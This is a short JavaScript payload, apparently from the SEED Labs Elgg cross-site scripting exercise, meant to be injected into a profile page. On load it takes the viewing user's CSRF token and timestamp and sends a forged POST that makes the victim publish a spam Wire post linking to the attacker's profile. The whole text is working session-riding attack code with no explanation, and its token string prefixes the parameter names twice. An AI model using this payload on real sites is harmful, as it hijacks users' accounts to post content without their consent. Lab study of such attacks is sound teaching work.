
<script type="text/javascript">
    window.onload = function(){
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token="&__elgg_token=" + elgg.security.token.__elgg_token;
        

        let sammy_id = 59;
        let victim_id = elgg.session.user.guid;
        let samy_profile_link = "http://www.seed-server.com/profile/samy"


        var sendurl = "http://www.seed-server.com/action/thewire/add";
        var content = "__elgg_token="+token+
                        "&__elgg_ts="+ts+
                        "&body="+`To earn 12 USD/Hour(!), visit now ${samy_profile_link}`;

        if(victim_id != sammy_id){
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
